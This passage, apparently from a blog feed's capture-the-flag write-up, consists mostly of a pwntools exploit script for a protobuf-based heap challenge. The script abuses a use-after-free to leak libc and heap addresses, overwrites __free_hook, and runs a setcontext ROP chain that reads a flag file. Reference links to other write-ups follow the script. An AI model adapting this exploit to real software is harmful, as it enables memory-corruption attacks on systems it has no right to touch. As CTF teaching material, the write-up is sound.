class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Devicemsg_pb2</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">idx, size, content=<span class="string">b&#x27;&#x27;</span></span>):</span></span><br><span class="line">    msg = Devicemsg_pb2.Devicemsg()</span><br><span class="line">    msg.actionid = <span class="number">1</span></span><br><span class="line">    msg.msgidx = idx</span><br><span class="line">    msg.msgsize = size</span><br><span class="line">    msg.msgcontent = content</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;You can try to have friendly communication with me now: &#x27;</span>)</span><br><span class="line">    r.send(msg.SerializeToString())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    msg = Devicemsg_pb2.Devicemsg()</span><br><span class="line">    msg.actionid = <span class="number">2</span></span><br><span class="line">    msg.msgidx = idx</span><br><span class="line">    msg.msgsize = <span class="number">0</span></span><br><span class="line">    msg.msgcontent = content</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;You can try to have friendly communication with me now: &#x27;</span>)</span><br><span class="line">    r.send(msg.SerializeToString())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    msg = Devicemsg_pb2.Devicemsg()</span><br><span class="line">    msg.actionid = <span class="number">3</span></span><br><span class="line">    msg.msgidx = idx</span><br><span class="line">    msg.msgsize = <span class="number">0</span></span><br><span class="line">    msg.msgcontent = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;You can try to have friendly communication with me now: &#x27;</span>)</span><br><span class="line">    r.send(msg.SerializeToString())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    msg = Devicemsg_pb2.Devicemsg()</span><br><span class="line">    msg.actionid = <span class="number">4</span></span><br><span class="line">    msg.msgidx = idx</span><br><span class="line">    msg.msgsize = <span class="number">0</span></span><br><span class="line">    msg.msgcontent = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;You can try to have friendly communication with me now: &#x27;</span>)</span><br><span class="line">    r.send(msg.SerializeToString())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    create(i, <span class="number">0xf0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    delete(<span class="number">7</span>-i)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.recv(<span class="number">0x50</span>)</span><br><span class="line">libc_base = u64(r.recv(<span class="number">8</span>)) - <span class="number">0x1ecbe0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base =&gt; &quot;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">heap_base = u64(r.recv(<span class="number">8</span>)) - <span class="number">0x590</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;heap_base =&gt; &quot;</span>, <span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">setcontext = libc_base + libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">61</span></span><br><span class="line">__free_hook = libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">open_addr = libc_base + libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr = libc_base + libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">puts_addr = libc_base + libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">ret_addr = libc_base + <span class="number">0x0000000000022679</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x0000000000023b6a</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x000000000002601f</span></span><br><span class="line">pop_rdx = libc_base + <span class="number">0x0000000000142c92</span></span><br><span class="line">magic_gadget = libc_base + <span class="number">0x151990</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, flat(__free_hook, <span class="number">0</span>))</span><br><span class="line">create(<span class="number">8</span>, <span class="number">0xf0</span>)</span><br><span class="line">create(<span class="number">9</span>, <span class="number">0xf0</span>, flat(magic_gadget))</span><br><span class="line"></span><br><span class="line">flag_addr = heap_base + <span class="number">0x440</span></span><br><span class="line"></span><br><span class="line">rop_chain = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">rop_chain += flat(pop_rdi, flag_addr, pop_rsi, <span class="number">2</span>, open_addr)</span><br><span class="line">rop_chain += flat(pop_rdi, <span class="number">3</span>, pop_rsi, libc_base +</span><br><span class="line">                  libc.bss() + <span class="number">0x500</span>, pop_rdx, <span class="number">0x50</span>, read_addr)</span><br><span class="line">rop_chain += flat(pop_rdi, libc_base + libc.bss() + <span class="number">0x500</span>, puts_addr)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&#x27;./flag&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>, flag_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>) + flat(setcontext)</span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>, <span class="string">b&#x27;\x00&#x27;</span>) + rop_chain</span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>, <span class="string">b&#x27;\x00&#x27;</span>) + flat(flag_addr + <span class="number">0x28</span>, ret_addr)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">8</span>, payload)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><hr><p>参考链接：</p><p>​<a class="link"   href="https://xp0int.top/posts/2023/05/28/2023-CISCN-%E5%88%9D%E8%B5%9B-Writeup-By-Xp0int/#42-strangetalkbot" >https://xp0int.top/posts/2023/05/28/2023-CISCN-%E5%88%9D%E8%B5%9B-Writeup-By-Xp0int/#42-strangetalkbot<i class="fas fa-external-link-alt"></i></a></p><p>​<a class="link"   href="https://github1s.com/protobuf-c/protobuf-c/blob/HEAD/protobuf-c/protobuf-c.c#L3028" >https://github1s.com/protobuf-c/protobuf-c/blob/HEAD/protobuf-c/protobuf-c.c#L3028<i class="fas fa-external-link-alt"></i></a></p><p>​<a class="link"   href="https://www.jianshu.com/p/a7e88cb17031" >https://www.jianshu.com/p/a7e88cb17031<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;其实在以前已经多次遇见过&lt;code&gt;protobuf&lt;/code&gt;了，但是都不太在意因为总感觉会像musl库一样，存活一段时间后就消失了。所</summary>
      
    
    
    
    <category term="pwn" scheme="https://196082.github.io/categories/pwn/"/>
    
    
    <category term="UAF" scheme="https://196082.github.io/tags/UAF/"/>
    
    <category term="protobuf" scheme="https://196082.github.io/tags/protobuf/"/>
    
  </entry>
  
</feed>
